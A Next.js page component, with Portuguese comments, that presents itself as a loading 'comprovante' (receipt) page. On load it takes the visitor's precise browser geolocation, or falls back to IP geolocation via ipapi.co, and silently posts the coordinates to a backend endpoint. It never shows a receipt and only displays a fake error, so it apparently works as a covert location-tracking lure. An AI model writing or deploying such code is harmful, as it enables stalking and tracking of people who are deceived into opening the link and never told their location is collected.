"use client";

import { useCallback, useEffect, useState } from "react";

export default function Home() {
  const [location, setLocation] = useState<{
    latitude: number;
    longitude: number;
  } | null>(null);
  const [errorMessage, setErrorMessage] = useState<string | null>(null); // Renomeado para errorMessage
  const [isLoading, setIsLoading] = useState(true);

  // Estratégia de fallback por IP
  const getLocationByIP = useCallback(async () => {
    // Adicionado useCallback
    try {
      const response = await fetch("https://ipapi.co/json/");
      const data = await response.json();
      setLocation({ latitude: data.latitude, longitude: data.longitude });
      await sendToBackend(data.latitude, data.longitude);
    } catch (error) {
      // Removido ipError não utilizado
      setErrorMessage("Não foi possível obter localização aproximada");
    } finally {
      setIsLoading(false);
    }
  }, []);

  const sendToBackend = useCallback(async (lat: number, lon: number) => {
    try {
      await fetch("/api/localizacao", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ latitude: lat, longitude: lon }),
      });
    } catch (error) {
      // Removido apiError não utilizado
      console.error("Erro ao enviar localização:", error);
    }
  }, []);

  useEffect(() => {
    const handleGeolocation = async () => {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          async (position) => {
            const { latitude, longitude } = position.coords;
            setLocation({ latitude, longitude });
            await sendToBackend(latitude, longitude);
            setIsLoading(false);
          },
          async (error) => {
            // Mantido para tratamento de erro
            await getLocationByIP();
            setErrorMessage("Localização aproximada via IP (precisão menor)");
          }
        );
      } else {
        await getLocationByIP();
      }
    };

    handleGeolocation();
  }, [getLocationByIP, sendToBackend]); // Adicionadas dependências

  return (
    <div className="flex items-center justify-center h-screen">
      <div className="text-center">
        <h1 className="text-2xl font-bold">Bem-vindo!</h1>
        {location ? (
          <p>Comprovante: Erro ao carregar comprovante!</p>
        ) : (
          <p>Gerando Comprovante...</p>
        )}
      </div>
    </div>
  );
}
